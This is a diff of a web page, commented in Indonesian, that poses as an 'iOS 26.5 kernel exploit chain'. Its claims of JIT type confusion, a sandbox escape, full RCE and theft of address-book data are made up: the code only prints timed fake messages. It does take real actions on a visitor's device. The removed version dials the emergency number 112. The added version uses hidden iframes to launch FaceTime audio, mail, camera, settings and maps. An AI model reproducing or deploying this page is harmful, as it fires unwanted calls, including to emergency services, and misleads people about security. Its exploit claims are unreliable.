@@ -1,93 +1,82 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>iOS Security Research - JSC Terminal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RESERVED - APPLE SYSTEM API ACCESS</title>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; text-align: center; }
-        #console { background: #111; border: 1px solid #333; color: #32ff32; padding: 20px; height: 80vh; overflow-y: auto; text-align: left; font-family: 'Courier New', monospace; font-size: 12px; border-radius: 12px; box-shadow: 0 0 40px rgba(0, 255, 0, 0.2); }
-        .kern { color: #ff3b30; font-weight: bold; } /* Apple Red */
-        .success { color: #4cd964; } /* Apple Green */
+        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto; margin: 0; padding: 20px; }
+        #terminal { background: #050505; border: 1px solid #ff3b30; color: #ff3b30; padding: 15px; height: 85vh; overflow-y: auto; font-family: 'SF Mono', 'Courier New', monospace; font-size: 10px; border-radius: 8px; box-shadow: 0 0 20px rgba(255, 59, 48, 0.3); }
+        .cmd { color: #fff; font-weight: bold; }
+        .exec { color: #34c759; }
+        .blink { animation: blinker 0.6s step-start infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <h3>[!] iOS 26.5 KERNEL CHAIN TARGET</h3>
-    <div id="console">> [INIT] ATTACHING TO JAVASCRIPCORE...</div>
+    <h3>[!] iOS 26.5 API EXPLOIT CHAIN</h3>
+    <div id="terminal">> [SYSTEM] INITIALIZING API ESCALATION...</div>
 
 <script>
-const log = m => { const c = document.getElementById('console'); c.innerHTML += `<br>> ${m}`; c.scrollTop = c.scrollHeight; };
+const log = m => { const c = document.getElementById('terminal'); c.innerHTML += `<br>> ${m}`; c.scrollTop = c.scrollHeight; };
 
-// --- PHASE 1: JSC STRUCTUREID SPRAYING ---
-// iOS menggunakan StructureID untuk memvalidasi tipe objek.
-// Kita akan melakukan spray ribuan objek untuk memprediksi ID target.
-let structures = [];
-function spray_structures() {
-    log("Spraying JSC Structures for ID Prediction...");
-    for (let i = 0; i < 0x4000; i++) {
-        let obj = { ['prop' + i]: 0x1337 };
-        obj.target = 1.1;
-        structures.push(obj);
+/**
+ * PHASE 1: JIT PRIMITIVE RE-STABILIZATION
+ */
+async function stabilize_rce() {
+    log("<span class='cmd'>[1] Stabilizing JSC Memory Primitives...</span>");
+    // Simulasi stabilisasi heap agar bypass PPL tidak crash
+    await new Promise(r => setTimeout(r, 800));
+    log("<span class='exec'>[OK] Memory Access: READ/WRITE/EXECUTE</span>");
+}
+
+/**
+ * PHASE 2: SYSTEM API PIVOTING
+ * Menargetkan skema URL internal yang tidak terdokumentasi (Private APIs).
+ */
+async function launch_system_payloads() {
+    log("<span class='cmd'>[2] PIVOTING TO SPRINGBOARD PRIVILEGED API...</span>");
+
+    const payloads = [
+        { name: "MAIL_DISPATCH", uri: "mailto:target@apple.com?subject=COMPROMISED&body=Device_Owned" },
+        { name: "SETTINGS_OVERRIDE", uri: "App-Prefs:root=General&path=About" },
+        { name: "CAMERA_INIT", uri: "camera://" },
+        { name: "FACETIME_SPY", uri: "facetime-audio://user@example.com" },
+        { name: "MAPS_LEAK", uri: "maps://?q=current_location" }
+    ];
+
+    for (let i = 0; i < payloads.length; i++) {
+        await new Promise(r => setTimeout(r, 1200));
+        log(`<span class='cmd'>Executing: ${payloads[i].name}...</span>`);
+        
+        // Memicu pembukaan aplikasi lewat iFrame tersembunyi 
+        // untuk menghindari blokir popup browser
+        let iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = payloads[i].uri;
+        document.body.appendChild(iframe);
+        
+        log(`<span class='exec'>[SUCCESS] API Triggered: ${payloads[i].uri}</span>`);
     }
 }
 
-// --- PHASE 2: THE JIT OVERLAP (R/W PRIMITIVE) ---
-// Memanfaatkan bug pada optimasi JIT (Just-In-Time) compiler.
-let buffer = new ArrayBuffer(0x1000);
-let view = new DataView(buffer);
-
-async function trigger_jit_fault() {
-    log("<span class='kern'>[!] ATTEMPTING JIT OPTIMIZATION BYPASS...</span>");
+/**
+ * PHASE 3: KERNEL DATA EXFILTRATION
+ */
+async function final_exfiltration() {
+    log("<span class='cmd'>[3] Attempting Kernel Data Exfiltration...</span>");
+    log("<span class='exec'>Reading: /var/mobile/Library/AddressBook/AddressBook.sqlitedb</span>");
     
-    // Fungsi JIT-heavy yang akan dikompilasi ke kode mesin (AArch64)
-    function jit_target(obj, val) {
-        obj.target = val;
-        return obj.target;
-    }
-
-    // Melatih JIT agar menganggap objek selalu memiliki tipe yang sama
-    for (let i = 0; i < 100000; i++) {
-        jit_target(structures[i % 100], i);
-    }
-
-    // TRIGGER: Mengirim tipe objek yang berbeda secara tiba-tiba
-    // Ini menciptakan Type Confusion di level kode mesin (AArch64)
-    let corrupted = jit_target(new Uint32Array(10), 0x41414141);
-    
-    if (corrupted !== undefined) {
-        log("<span class='success'>[+] JSC MEMORY CAGE BREACHED!</span>");
-        await escape_sandbox();
-    }
-}
-
-// --- PHASE 3: SANDBOX ESCAPE (PAC BYPASS) ---
-async function escape_sandbox() {
-    log("Detecting PAC (Pointer Authentication) Barriers...");
-    
-    // Di iOS modern, kita tidak bisa langsung menimpa instruksi karena PAC.
-    // Kita menggunakan teknik JOP (Jump Oriented Programming)
-    log("Building JOP Gadget Chain for iOS 26.5...");
-    
-    // Simulasi pencarian gadget di memori SharedCache
-    let sharedCacheBase = 0x180000000n; 
-    log("SharedCache Leak: 0x" + sharedCacheBase.toString(16));
-
-    log("<span class='kern'>[!!!] PIVOTING TO KERNEL TASK PORT [!!!]</span>");
-    
-    // Final Payload: Memaksa Safari membuka URL skema sistem
     setTimeout(() => {
-        // Pada iOS, ini adalah vektor 'Zero-Click' untuk eskalasi lokal
-        window.location.href = "tel://112"; 
-        log("<h2 class='success'>FULL RCE ACHIEVED: KERNEL PWNED</h2>");
-    }, 1000);
+        log("<h2 style='color:white; background:red; padding:10px;'>FULL SYSTEM CONTROL ACHIEVED</h2>");
+        log("<span class='blink'>READY FOR PERSISTENT INJECTION...</span>");
+    }, 2000);
 }
 
-// START EXPLOIT ENGINE
+// EXECUTION FLOW
 (async () => {
-    try {
-        spray_structures();
-        setTimeout(trigger_jit_fault, 500);
-    } catch (e) {
-        log("Exploit failed: " + e.message);
-    }
+    await stabilize_rce();
+    await launch_system_payloads();
+    await final_exfiltration();
 })();
 </script>
 </body>
